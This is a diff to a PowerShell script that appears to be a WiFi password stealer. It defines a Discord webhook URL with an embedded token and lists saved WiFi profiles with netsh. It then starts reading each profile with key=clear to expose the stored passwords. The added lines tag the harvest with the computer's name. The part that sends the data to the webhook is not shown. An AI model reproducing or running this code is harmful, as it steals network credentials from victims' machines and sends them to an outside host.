@@ -1,11 +1,16 @@
 # Define your webhook URL and the message string
 $WebhookUrl = "https://discord.com/api/webhooks/1522586603615162469/cSzV4hP6LxzHVQKQjOH7ZKAjKSL9Dd_dXSzbSzViTz-DvlS2C1J7aSZkG3tD871SCXwY"
 
+$deviceName = $env:COMPUTERNAME
+$Message += "`n--- $deviceName ---"
+
 $profiles = netsh wlan show profiles |
     Select-String "All User Profile" |
     ForEach-Object {
         $_.Line.Split(":")[1].Trim()
     }
+
+$Message += "`nWiFi Data:"
     
 foreach ($profileName in $profiles) {
     $profileInfo = netsh wlan show profile name="$profileName" key=clear
